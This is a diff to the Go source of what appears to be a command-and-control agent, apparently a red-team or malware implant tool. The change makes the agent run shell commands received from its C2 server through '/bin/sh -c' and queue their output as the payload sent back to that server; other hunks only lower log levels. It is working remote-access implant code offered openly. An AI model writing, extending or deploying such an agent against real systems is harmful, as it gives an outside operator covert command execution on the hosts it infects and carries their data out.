@@ -50,14 +50,14 @@ func ActuallyRunCommand(command string) {
 	defer cancel()                                                          // The cancel should be deferred so resources are cleaned up
 
 	cmd := exec.CommandContext(ctx, "/bin/sh", "-c", command)
-	//todo: we should find a way to return this back to C2. otherwise it's pointless
-	out, err := cmd.CombinedOutput()
-	if err != nil {
-		log.Errorf("Error in running command '%#v' from C2, %v", cmd, err)
-	}
 
+	out, err := cmd.CombinedOutput()
 	AgentStatus.NextMessageType = c2.MessageExecuteCommandRes
 	AgentStatus.NextPayload = out
+	if err != nil {
+		log.Warnf("Error in running command %s: %s", cmd, err)
+		cancel()
+	}
 
 }
 
@@ -115,7 +115,7 @@ func handleServerCommand(msgList []c2.MessagePacketWithSignature) error {
 			for _, Q := range Questions {
 				err = SendQuestionToServer(Q)
 				if err != nil {
-					log.Warnf("Error sending Message to Server: %s", err)
+					log.Infof("Error sending Message to Server: %s", err)
 				}
 			}
 			if err != nil {
@@ -244,7 +244,7 @@ func RunAgent(cmd *cobra.Command, args []string) error {
 				for _, Q := range Questions {
 					err = SendQuestionToServer(Q)
 					if err != nil {
-						log.Warnf("Error sending Message to Server: %s", err)
+						log.Infof("Error sending Message to Server: %s", err)
 					}
 				}
 			}
